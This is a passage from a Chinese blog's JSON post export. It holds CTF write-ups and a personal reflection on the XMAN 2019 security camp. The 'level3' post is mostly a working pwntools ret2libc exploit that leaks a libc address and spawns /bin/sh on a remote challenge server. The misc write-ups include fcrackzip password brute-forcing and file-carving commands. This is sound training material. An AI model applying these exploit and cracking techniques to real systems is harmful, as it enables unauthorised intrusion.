i in range(0,50): p.recvuntil('Give me the point(1~6): ') p.sendline(num[index]) index=index+1p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"level3","date":"2019-08-15T14:34:34.000Z","path":"2019/08/15/XCTF-PWN/","text":"level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, \"Input:\\n\", 7u); return read(0, &amp;buf, 256u);&#125; exp: 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *context.log_level='debug'# payload = cyclic(0x100)io = process('./level3')io = remote('111.198.29.45',45330)elf = ELF('./level3')write_plt = elf.plt['write']write_got = elf.got['write']main_addr = 0x08048484# gdb.attach(io)payload1 = 0x8c*'a'+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil('Input:\\n')# pause()io.sendline(payload1)write = u32(io.recv(4))info('write:'+hex(write))obj = LibcSearcher(\"write\", write)system = write + obj.dump(\"system\") - obj.dump(\"write\") #system offsetbin_sh = write + obj.dump(\"str_bin_sh\") - obj.dump(\"write\") #/bin/sh offsetinfo('system:'+hex(system))info('/bin/sh:'+hex(bin_sh))payload2 = 0x8c*'b'+p32(system)+p32(main_addr)+p32(bin_sh)io.recvuntil('Input:\\n')# pause()io.sendline(payload2)io.interactive() 调试技巧: 在read处按下Tab键找到地址 断点下在 0x08048482 处 12.text:08048482 leave.text:08048483 retn python里加上调试语句，python脚本运行时会自动打开gdb进行调试。 1# gdb.attach(io) 但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让12345```pythonio.recvuntil(&apos;Input:\\n&apos;)# pause()io.sendline(payload1) 123io.recvuntil('Input:\\n')# pause()io.sendline(payload2) 在填充至返回地址的时候，可以用gdb跟踪到ret指令处，此时查看$esp寄存器的内容，可以检查自己的地址是否填正确。","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"}]},{"title":"xman-misc","date":"2019-08-12T10:14:10.000Z","path":"2019/08/12/xman-misc/","text":"cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。 ceph1 追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面 ceph2 linux下使用tcpxtract分离，其中一张图片即为flag 1tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap Erik-Baleog-and-Olaf压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同 1compare hint.png stego100.png -compose src diff.png hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可 Miscellaneous-300一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压 12345678910111213import os,sys,zipfileoriginal_file='12475.zip'while True: original_file = zipfile.ZipFile(original_file) if 'zip' in original_file.namelist()[0]: inner_zipfile = original_file.namelist()[0] original_file_password = inner_zipfile[:inner_zipfile.find('.')] original_file.setpassword(original_file_password) original_file.extractall() os.remove(original_file.filename) original_file = inner_zipfile else: break 到最后一层12475.zip无法解压了，这个时候进行爆破 1fcrackzip -u -l 1-6 -c 'a1' 12475.zip -u：使用unzip解压 -l：后面接长度范围 -c：后接字符，a为所有小写字母，1是数字[0-9] 小小的PDF打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容 1foremost -i 2333.pdf -o test foremost是基于文件头及尾部信息恢复文件的工具。 Refference https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/ https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300","tags":[{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"}]},{"title":"XMAN-2019-福州营","date":"2019-08-11T09:55:59.000Z","path":"2019/08/11/xman/","text":"该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。","tags":[]}]